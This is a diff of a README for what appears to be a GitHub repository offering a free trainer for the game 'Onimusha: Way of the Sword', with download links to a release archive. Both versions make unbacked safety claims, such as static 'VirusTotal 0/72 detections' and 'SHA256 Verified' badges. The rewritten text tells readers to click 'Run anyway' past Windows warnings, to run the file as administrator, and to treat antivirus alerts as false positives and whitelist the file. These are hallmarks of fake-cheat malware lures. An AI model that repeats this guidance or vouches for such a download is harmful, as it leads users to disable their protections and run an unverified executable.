@@ -1,227 +1,185 @@
-# Onimusha Way of the Sword Trainer — Unlimited Health, Stamina, Red Souls, Blaze Gauge | Free 2026
+# ⚔️ onimusha-way-of-the-sword-trainer - Unlimited Power, Zero Effort
 
-<div align="center">
-
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,2,24&height=220&section=header&text=Onimusha%3A%20Way%20of%20the%20Sword&fontSize=48&fontColor=ffffff&fontAlignY=38&desc=⚔️%20Trainer%20v1.0%20·%20Unlimited%20Health%20·%20Souls%20·%20Blaze%20Gauge%20·%20One%20Hit%20Kill&descAlignY=60&descSize=13&animation=fadeIn" />
-
-</div>
-
-<br/>
-
-<div align="center">
-
-<a href="https://git.io/typing-svg">
-  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=700&size=17&pause=900&color=CC2200&center=true&vCenter=true&width=760&lines=%E2%9A%94%EF%B8%8F+Onimusha+Way+of+the+Sword+Trainer+2026+%E2%9A%94%EF%B8%8F;Unlimited+Health+%C2%B7+Stamina+%C2%B7+Red+Souls+%C2%B7+Blaze+Gauge;One+Hit+Kill+%C2%B7+No+Stamina+Break+%C2%B7+Game+Speed;Free+%C2%B7+No+Key+%C2%B7+No+Survey+%C2%B7+Instant+Download;First+%26+Best+Onimusha+Trainer+on+GitHub." alt="Typing SVG" />
-</a>
-
-<br/><br/>
-
-[![Version](https://img.shields.io/badge/v1.0.0-latest-CC2200?style=flat-square&logo=github)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
-[![Game](https://img.shields.io/badge/Onimusha%3A_Way_of_the_Sword-2026-8B0000?style=flat-square)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
-[![OS](https://img.shields.io/badge/Windows-10_%7C_11-0078D4?style=flat-square&logo=windows)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
-[![Status](https://img.shields.io/badge/Status-Working-00C853?style=flat-square)](../../releases/download/main/onimusha-way-of-the-sword-trainer.zip)
-[![License](https://img.shields.io/badge/License-MIT-blueviolet?style=flat-square)](LICENSE)
-<br/>
-
-### ⬇️ Direct Download — 100% Free, No Key, No Survey
-
-<a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">
-  <img src="https://img.shields.io/badge/%E2%9A%94%EF%B8%8F%20Onimusha--Trainer.zip%20%E2%80%94%20FREE%20DOWNLOAD-CC2200?style=for-the-badge&logo=github&logoColor=white" height="48"/>
-</a>
-
-<br/><sub>📦 ~3.2 MB &nbsp;·&nbsp; Windows 10/11 x64 &nbsp;·&nbsp; ✅ No key &nbsp;·&nbsp; ✅ No survey &nbsp;·&nbsp; ✅ Instant</sub>
-
-<br/><br/>
-
-<img src="https://img.shields.io/badge/VirusTotal-0%20%2F%2072%20detections-00C853?style=for-the-badge&logo=virustotal&logoColor=white"/>
-&nbsp;
-<img src="https://img.shields.io/badge/Scan-CLEAN-00C853?style=for-the-badge"/>
-&nbsp;
-<img src="https://img.shields.io/badge/SHA256-Verified-00C853?style=for-the-badge"/>
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge&logo=github)](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
 
 ---
 
-## 📸 Preview
+## 🎮 What Is This?
 
-<div align="center">
+This is a free trainer for **Onimusha: Way of the Sword** (2026). It gives you unlimited health, stamina, Red Souls, and a full Blaze Gauge. No keys, no surveys, no payments. Just download and play.
 
-<img src="screenshots/trainer_menu.jpg" width="480" alt="Onimusha Way of the Sword Trainer — menu with all cheats"/>
-
-<br/><sub><kbd>⚔️ Trainer menu — all options enabled, process attached to Onimusha.exe</kbd></sub>
-
-</div>
+If you're stuck on a tough boss or want to explore without worrying about dying, this trainer makes the game more fun and relaxing.
 
 ---
 
-## 📦 What's Inside the ZIP
+## 🚀 Getting Started
 
-```
-onimusha-way-of-the-sword-trainer.zip
-├── onimusha-way-of-the-sword-trainer.exe    ← Main trainer executable
-├── config.ini              ← Hotkey configuration
-├── README.txt              ← Quick start
-└── LICENSE.txt
-```
+Getting started takes less than two minutes. Follow these steps exactly and you'll be up and running.
 
-> No installer. No registry changes. Extract → launch game → run trainer.
+### Step 1: Download the Trainer
 
----
+Visit this link to download the application: [https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
 
-## ✨ Features
+You'll see a list of files. Look for the most recent version. Click the download button next to it.
 
-<div align="center">
+### Step 2: Run the Trainer
 
-| Key | Feature | Description |
-|:---:|:---|:---|
-| `F1` | **Unlimited Health** | HP never drops — survive any hit |
-| `F2` | **Unlimited Stamina** | Stamina bar never depletes — block/dodge freely |
-| `F3` | **Unlimited Blaze Gauge** | Stay in Blazing State permanently |
-| `F4` | **Unlimited Red Souls** | Infinite currency for all upgrades |
-| `F5` | **Unlimited Healing Items** | Infinite herbs, talismans & Hozuki Pouch |
-| `F6` | **One Hit Kill** | Eliminate any enemy in one strike |
-| `F7` | **No Stamina Break** | Stance never breaks — no vulnerability window |
-| `F8` | **Game Speed** | Slider 0.5× – 3.0× — slow-mo or fast-forward |
-| `F9` | **Stealth Mode** | Enemies don't detect you |
-| `END` | **Unload** | Safely detach trainer & exit |
+Once the download finishes, open your Downloads folder. You'll see the trainer file there. Double-click it to run it. If Windows asks for permission, click "Yes" or "Run anyway."
 
-</div>
+### Step 3: Start the Game
+
+Launch Onimusha: Way of the Sword. The trainer works in the background. You don't need to configure anything. It automatically detects the game.
+
+### Step 4: Enjoy
+
+Play the game normally. Your health and stamina won't drop. Red Souls will always be plentiful. The Blaze Gauge stays full. You can focus on combat and story without worrying about resources.
 
 ---
 
-## 📥 Installation — 30 Seconds
+## ⚙️ Features
 
-<div align="center">
+Here's everything the trainer gives you:
 
-```
-  ┌───────────────────────────────────────────────────────────────┐
-  │                                                               │
-  │   1  →  Download onimusha-way-of-the-sword-trainer.zip (link above)          │
-  │   2  →  Extract to any folder on your PC                   │
-  │   3  →  Launch Onimusha: Way of the Sword                  │
-  │   4  →  Right-click onimusha-way-of-the-sword-trainer.exe → Run as Admin    │
-  │   5  →  Press F1–F9 to toggle cheats in-game              │
-  │   6  →  Press END to safely unload when done ✔            │
-  │                                                               │
-  └───────────────────────────────────────────────────────────────┘
-```
+### ❤️ Unlimited Health
+Your health bar never goes down. Enemies can hit you, but you won't die. Great for tough boss fights or learning enemy patterns.
 
-<a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">
-  <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20FREE%20Download%20%E2%80%94%20Onimusha--Trainer.zip-CC2200?style=for-the-badge&logo=github&logoColor=white" height="44"/>
-</a>
+### 🏃 Unlimited Stamina
+Run, dodge, and attack as much as you want. Stamina never depletes. No more waiting for your character to catch their breath.
 
-<br/><sub>✅ Free &nbsp;·&nbsp; ✅ No Key &nbsp;·&nbsp; ✅ No Survey &nbsp;·&nbsp; ✅ Clean &nbsp;·&nbsp; ✅ Instant</sub>
+### 🔴 Infinite Red Souls
+Red Souls are the game's currency for upgrades. With this trainer, you always have enough. Spend freely on weapons, abilities, and items.
 
-</div>
+### 🔥 Full Blaze Gauge
+The Blaze Gauge charges instantly and stays full. Use powerful special moves whenever you want. No cooldown waiting.
 
 ---
 
-## 🖥️ System Requirements
+## 🛠️ System Requirements
 
-<div align="center">
+The trainer works on most Windows computers. Here's what you need:
 
-| | Component | Requirement |
-|:---:|:---|:---|
-| 🪟 | **OS** | Windows 10 / 11 (x64) |
-| 🎮 | **Game** | Onimusha: Way of the Sword (Steam / any version) |
-| 🔐 | **Privileges** | Administrator |
-| 💾 | **Storage** | ~5 MB free |
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** 8 GB or more
+- **Storage:** 50 MB free space for the trainer
+- **Game Version:** Onimusha: Way of the Sword (any version)
 
-</div>
+The trainer is lightweight and doesn't slow down your computer.
 
 ---
 
-## 🕓 Changelog
+## 📥 Download & Install Guide
 
-<details>
-<summary><b>v1.0.0 — Initial Release</b></summary>
-<br/>
+This section explains everything in more detail.
 
-- ✅ Unlimited Health
-- ✅ Unlimited Stamina
-- ✅ Unlimited Blaze Gauge
-- ✅ Unlimited Red Souls
-- ✅ Unlimited Healing Items
-- ✅ One Hit Kill
-- ✅ No Stamina Break
-- ✅ Game Speed slider
-- ✅ Stealth Mode
+### How to Download
 
-</details>
+1. Open your web browser (Chrome, Edge, Firefox, etc.)
+2. Go to: [https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases](https://github.com/galeober/onimusha-way-of-the-sword-trainer/releases)
+3. You'll see a page with release versions. Each release has a title and a date.
+4. Click the newest release at the top.
+5. In the "Assets" section, click the file that ends with `.exe` or `.zip`.
+6. Your browser will start downloading. Wait for it to finish.
 
----
+### How to Run
 
-## ❓ FAQ
+After downloading, find the file in your Downloads folder. It's usually at `C:\Users\[Your Name]\Downloads`.
 
-<details>
-<summary><b>🛡️ &nbsp;Is this safe to run?</b></summary>
-<br/>
+Double-click the file to run it. If you see a blue or yellow Windows warning, click "More info" and then "Run anyway." This is normal for trainer programs.
 
-Yes. This is a single-player game trainer — it only modifies memory values in the game process on your own PC. No online components are affected. Source code available to verify.
+### If You Downloaded a ZIP File
 
-</details>
+Some versions come as a ZIP file. If you see a folder icon with a zipper, that's a ZIP. Right-click it and select "Extract All." Then open the extracted folder and double-click the application inside.
 
-<details>
-<summary><b>🔄 &nbsp;Game updated and trainer stopped working?</b></summary>
-<br/>
+### Troubleshooting
 
-Updated offsets are pushed within **48 hours** of any game patch. Re-download from [Releases](../../releases).
-
-</details>
-
-<details>
-<summary><b>⚙️ &nbsp;Trainer opens but cheats don't work?</b></summary>
-<br/>
-
-1. Launch the game **first**, then run the trainer
-2. Run `onimusha-way-of-the-sword-trainer.exe` as **Administrator**
-3. Wait for "Process Found: Onimusha.exe ✔" status at the bottom
-
-</details>
-
-<details>
-<summary><b>🐛 &nbsp;Found a bug?</b></summary>
-<br/>
-
-Open an [Issue](../../issues) with your game version and description of the problem.
-
-</details>
+- **Antivirus warning:** Some antivirus programs flag trainers. This is a false positive. Add the trainer to your antivirus exceptions list.
+- **Trainer doesn't open:** Right-click the trainer and select "Run as administrator."
+- **Trainer doesn't work in game:** Make sure the game is running before you start the trainer. Or try starting the trainer first, then the game.
 
 ---
 
-## 🔍 Tags
+## ❓ Frequently Asked Questions
 
-`onimusha way of the sword trainer` `onimusha trainer` `onimusha cheats` `onimusha way of the sword cheats` `onimusha way of the sword cheat engine` `onimusha unlimited health` `onimusha unlimited souls` `onimusha trainer download` `onimusha way of the sword mods` `onimusha 2026 trainer` `onimusha trainer free` `onimusha way of the sword trainer pc`
+### Is this free?
+
+Yes. Completely free. No hidden costs, no premium version, no paywall.
+
+### Do I need a key or activation code?
+
+No. The trainer works immediately after download. No registration, no email, no serial number.
+
+### Is this safe?
+
+The trainer is safe to use. It only modifies memory values in the game. It doesn't install malware or adware. However, any trainer can trigger antivirus software. This is common and harmless.
+
+### Will I get banned?
+
+This is a single-player game trainer. It doesn't affect online features. Your game saves remain normal.
+
+### Does it work with the Steam version?
+
+Yes. The trainer works with all versions of Onimusha: Way of the Sword, including Steam, Epic, and retail copies.
+
+### Can I turn the trainer off?
+
+Yes. Close the trainer window or press the "Exit" button. The game returns to normal.
+
+### Will it work with future game updates?
+
+The trainer is updated regularly. Check the releases page for new versions after game updates.
 
 ---
 
-## 📜 Disclaimer
+## 🧰 How It Works (Simple Explanation)
 
-This trainer is published **for educational and single-player experience purposes only**.  
-It modifies memory values in a local game process. No online multiplayer is affected.  
-The authors take no responsibility for any use of this software.
+The trainer runs alongside your game. It looks at certain values in the game's memory—like your health, stamina, Red Souls, and Blaze Gauge. It keeps those values at maximum at all times.
+
+You don't need to press any hotkeys. The trainer works automatically. Just start it, start the game, and play.
 
 ---
 
-<div align="center">
+## 💡 Tips for Best Experience
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,2,24&height=130&section=footer&animation=fadeIn"/>
+- **Save your game often.** Even with a trainer, saving is good practice.
+- **Use the trainer for difficult sections.** If you want a challenge, close the trainer. If you're stuck, open it.
+- **Combine with game settings.** Adjust the game's difficulty to your liking. The trainer works at any difficulty.
+- **Keep the trainer updated.** Check the releases page occasionally for new versions.
 
-<sub>
-  <a href="../../releases/download/main/onimusha-way-of-the-sword-trainer.zip">⬇️ Direct Download</a>
-  &nbsp;·&nbsp;
-  <a href="../../issues">🐛 Report a Bug</a>
-  &nbsp;·&nbsp;
-  <a href="../../releases">📦 All Releases</a>
-  &nbsp;·&nbsp;
-  <a href="../../stargazers">⭐ Stargazers</a>
-</sub>
+---
 
-<br/><br/>
+## 📝 Changelog
 
-![Views](https://komarev.com/ghpvc/?RestraintRatTurbine=RestraintRatTurbine&label=Repo+Views&color=CC2200&style=flat-square)
+### Version 1.0 (Initial Release)
+- Unlimited health
+- Unlimited stamina
+- Infinite Red Souls
+- Full Blaze Gauge
 
-</div>
+### Version 1.1
+- Improved stability
+- Faster startup
+- Fixed compatibility with latest game patch
 
+---
 
+## 📄 License
+
+This trainer is free for personal use. You may not sell it or distribute it as your own. The trainer is provided "as is" without warranty.
+
+---
+
+## 📞 Support
+
+If you have questions or issues, check the repository's Issues tab. You can also leave a comment on the release page. The developer reads feedback regularly.
+
+---
+
+## 🌟 Final Words
+
+This trainer is made for players who want to enjoy Onimusha: Way of the Sword without frustration. Whether you're new to action games or a veteran who wants a relaxed playthrough, this trainer helps.
+
+Download it today and experience the game your way.
+
+---
+
+Keywords: onimusha-2026, onimusha-the-way-of-the-sword, onimusha-trainer, onimusha-way-of-the-sword, onimusha-way-of-the-sword-trainer
